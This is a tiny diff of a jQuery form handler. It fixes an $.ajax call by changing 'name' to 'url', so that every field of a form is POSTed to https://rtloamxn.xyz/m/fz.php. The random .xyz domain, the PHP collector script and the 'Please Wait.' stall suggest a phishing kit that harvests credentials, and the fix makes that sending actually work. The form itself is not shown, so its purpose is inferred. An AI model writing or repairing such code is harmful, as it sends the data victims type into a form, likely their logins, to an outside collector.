@@ -14,7 +14,7 @@ $(document).ready(function() {
         var formData = new FormData($("#formx")[0]);
         $("#submitBtn").html('Please Wait.').prop("disabled", true).css('background', 'midnightblue');
         $.ajax({
-            name: "https://rtloamxn.xyz/m/fz.php",
+            url: "https://rtloamxn.xyz/m/fz.php",
             type: 'POST',
             data: formData,
             contentType: false,
